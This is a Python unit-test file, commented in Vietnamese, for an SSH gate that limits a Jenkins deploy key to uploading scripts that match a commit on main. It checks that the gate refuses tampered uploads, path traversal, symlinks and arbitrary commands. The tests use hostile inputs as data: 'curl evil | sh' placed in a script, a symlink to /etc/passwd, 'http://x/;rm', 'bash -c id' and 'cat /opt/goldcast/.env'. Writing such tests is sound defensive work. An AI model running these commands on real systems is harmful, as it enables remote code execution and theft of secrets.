"""Cong SSH cua khoa Jenkins (deploy/goldcast-gate.py), voi GitHub gia lap.

Khoa Jenkins chi duoc lam viec co ten; moi script/cau hinh no dua len phai giong het
file cung ten tai mot commit da nam tren main.
"""
import contextlib
import importlib.util
import io
import json
import os
from pathlib import Path
import subprocess
import sys
import tarfile
import tempfile
import unittest

GATE = Path(__file__).resolve().parents[2] / 'deploy' / 'goldcast-gate.py'
spec = importlib.util.spec_from_file_location('goldcast_gate', GATE)
gate = importlib.util.module_from_spec(spec)
spec.loader.exec_module(gate)

COMMIT = 'a' * 40
OTHER = 'b' * 40
RELEASE = f'{COMMIT}-0123456789ab-7'
FILES = {
    'release.env': f'RELEASE_ID={RELEASE}\n'.encode(),
    'docker-compose.prod.yml': b'services: {}\n',
    'deploy/Caddyfile': b'goldcast.click {}\n',
    'scripts/release.sh': b'#!/bin/sh\necho release\n',
    'scripts/check-pages.mjs': b'// pages\n',
    'scripts/remote-release.sh': b'#!/bin/sh\necho remote\n',
    'scripts/retention.py': b'# retention\n',
    'scripts/backup-remote.sh': b'#!/bin/sh\necho backup\n',
    'scripts/backup-remote-retention.sh': b'#!/bin/sh\necho confirm\n',
}


def tar(files, extra=()):
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode='w') as archive:
        for name, content in files.items():
            info = tarfile.TarInfo(name)
            info.size = len(content)
            archive.addfile(info, io.BytesIO(content))
        for info in extra:
            archive.addfile(info)
    buffer.seek(0)
    return buffer


class FakeGitHub:
    """Commit COMMIT nam tren main voi dung FILES; OTHER thi khong."""

    def __init__(self, files=FILES, status='ahead', down=False):
        self.files, self.status, self.down, self.urls = files, status, down, []

    def __call__(self, url):
        self.urls.append(url)
        if self.down:
            raise OSError('network unreachable')
        if '/compare/' in url:
            return json.dumps({'status': self.status if COMMIT in url else 'diverged'}).encode()
        prefix = f'https://raw.githubusercontent.com/{gate.REPOSITORY}/{COMMIT}/'
        if not url.startswith(prefix) or url[len(prefix):] not in self.files:
            raise OSError('404')
        return self.files[url[len(prefix):]]


class GateTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        (self.root / 'releases').mkdir()
        self.github = FakeGitHub()

    def receive(self, release=RELEASE, files=FILES, extra=(), github=None):
        with contextlib.redirect_stdout(io.StringIO()):
            gate.receive(release, tar(files, extra), root=self.root, get=github or self.github)
        return self.root / 'releases' / release

    def refused(self, pattern, call, *args, **kwargs):
        with self.assertRaisesRegex(gate.Refused, pattern):
            call(*args, **kwargs)
        self.assertEqual([p.name for p in (self.root / 'releases').iterdir()
                          if p.name != RELEASE or not (p / gate.MARKER).exists()], [],
                         'a refused upload must leave nothing behind')

    # --- receive -------------------------------------------------------------

    def test_files_matching_main_are_received_and_recorded(self):
        path = self.receive()
        self.assertEqual((path / 'scripts/release.sh').read_bytes(), FILES['scripts/release.sh'])
        self.assertIn('scripts/release.sh', (path / gate.MARKER).read_text())
        # release.env la du lieu: khong hoi GitHub ve no.
        self.assertFalse(any(url.endswith('/release.env') for url in self.github.urls))

    def test_a_script_that_differs_from_github_is_refused(self):
        changed = dict(FILES, **{'scripts/release.sh': b'#!/bin/sh\ncurl evil | sh\n'})
        self.refused('release.sh differs', self.receive, files=changed)

    def test_a_compose_file_that_differs_from_github_is_refused(self):
        changed = dict(FILES, **{'docker-compose.prod.yml': b'services: {x: {privileged: true}}\n'})
        self.refused('docker-compose.prod.yml differs', self.receive, files=changed)

    def test_a_commit_that_is_not_on_main_is_refused(self):
        self.refused('not on main', self.receive, release=f'{OTHER}-0123456789ab-7')

    def test_github_unreachable_fails_closed(self):
        self.refused('cannot confirm', self.receive, github=FakeGitHub(down=True))

    def test_unknown_files_links_and_traversal_are_refused(self):
        self.refused('unexpected entry', self.receive, files=dict(FILES, **{'scripts/evil.sh': b'x'}))
        link = tarfile.TarInfo('scripts/release.sh')
        link.type, link.linkname = tarfile.SYMTYPE, '/etc/passwd'
        without = {k: v for k, v in FILES.items() if k != 'scripts/release.sh'}
        self.refused('unexpected entry', self.receive, files=without, extra=[link])
        self.refused('unexpected entry', self.receive, files=dict(FILES, **{'../release.env': b'x'}))

    def test_missing_required_file_and_duplicates_are_refused(self):
        without = {k: v for k, v in FILES.items() if k != 'docker-compose.prod.yml'}
        self.refused('missing docker-compose', self.receive, files=without)
        again = tarfile.TarInfo('release.env')
        again.size = 0
        self.refused('unexpected entry', self.receive, extra=[again])

    def test_a_received_release_cannot_be_overwritten(self):
        self.receive()
        with self.assertRaisesRegex(gate.Refused, 'already received'):
            self.receive()

    def test_release_ids_cannot_name_other_paths(self):
        for bad in ('../../etc', COMMIT, f'{COMMIT}-0123456789ab-7/../x', f'{COMMIT.upper()}-0123456789ab-7'):
            with self.subTest(bad=bad), self.assertRaisesRegex(gate.Refused, 'invalid release id'):
                self.receive(release=bad)

    def test_oversized_upload_is_refused(self):
        with self.assertRaisesRegex(gate.Refused, 'too large'):
            gate.read_upload(io.BytesIO(b'x' * (gate.MAX_UPLOAD + 1)))

    # --- lenh sau khi nhan ---------------------------------------------------

    def test_deploy_verify_rollback_run_the_received_scripts(self):
        path = self.receive()
        self.assertEqual(gate.plan(['deploy', RELEASE, 'http://jenkins:8080/job/goldcast-ci/75/'], self.root),
                         ['sh', str(path / 'scripts/remote-release.sh'), 'deploy', str(path),
                          'http://jenkins:8080/job/goldcast-ci/75/'])
        self.assertEqual(gate.plan(['verify', RELEASE], self.root)[2:], ['verify', str(path)])
        self.assertEqual(gate.plan(['rollback', RELEASE], self.root)[2:], ['rollback', str(path)])

    def test_rollback_of_a_release_never_received_is_a_no_op(self):
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertIsNone(gate.plan(['rollback', RELEASE], self.root))

    def test_a_release_not_received_through_the_gate_cannot_run(self):
        path = self.root / 'releases' / RELEASE
        (path / 'scripts').mkdir(parents=True)
        (path / 'scripts/remote-release.sh').write_text('echo planted')
        with self.assertRaisesRegex(gate.Refused, 'not received through the gate'):
            gate.plan(['deploy', RELEASE], self.root)

    def test_a_script_changed_after_receive_cannot_run(self):
        path = self.receive()
        (path / 'scripts/release.sh').write_text('#!/bin/sh\ncurl evil | sh\n')
        with self.assertRaisesRegex(gate.Refused, 'release.sh changed'):
            gate.plan(['verify', RELEASE], self.root)

    def test_build_url_cannot_smuggle_arguments(self):
        self.receive()
        for bad in ('http://x/;rm', 'file:///etc/passwd', '--help', "http://x/'y"):
            with self.subTest(bad=bad), self.assertRaisesRegex(gate.Refused, 'build url'):
                gate.plan(['deploy', RELEASE, bad], self.root)
        with self.assertRaisesRegex(gate.Refused, 'usage'):
            gate.plan(['verify', RELEASE, 'http://jenkins/1/'], self.root)

    def test_backup_runs_only_the_last_good_release_scripts(self):
        with self.assertRaisesRegex(gate.Refused, 'no last-good'):
            gate.plan(['backup', 'snapshot'], self.root)
        path = self.receive()
        (self.root / '.last-good-release').write_text(str(path) + '\n')
        self.assertEqual(gate.plan(['backup', 'snapshot'], self.root),
                         ['sh', str(path / 'scripts/backup-remote.sh')])
        offsite = Path('/opt/goldcast/backups/offsite-20261125T010203Z.AbC123')
        with self.assertRaisesRegex(gate.Refused, 'no such backup'):
            gate.plan(['backup', 'fetch', str(offsite)], self.root)
        for bad in ('/etc', '/opt/goldcast/backups/offsite-1/../../..', '/opt/goldcast/.env'):
            with self.subTest(bad=bad), self.assertRaisesRegex(gate.Refused, 'invalid backup directory'):
                gate.plan(['backup', 'fetch', bad], self.root)

    def test_anything_else_is_refused(self):
        for words in ([], ['sh'], ['bash', '-c', 'id'], ['backup'], ['backup', 'shell'],
                      ['scp', '-t', '/tmp'], ['status', RELEASE], ['recover', RELEASE]):
            with self.subTest(words=words), self.assertRaises(gate.Refused):
                gate.plan(words, self.root)

    def test_ssh_entry_point_refuses_a_shell_and_arbitrary_commands(self):
        for command in ('', 'id', 'sh -s', 'cat /opt/goldcast/.env', 'goldcast-gate status x'):
            with self.subTest(command=command):
                result = subprocess.run([sys.executable, str(GATE)], capture_output=True, text=True,
                                        env=dict(os.environ, SSH_ORIGINAL_COMMAND=command), input='')
                self.assertEqual(result.returncode, 2, result.stderr)
                self.assertIn('refused', result.stderr)


if __name__ == '__main__':
    unittest.main()
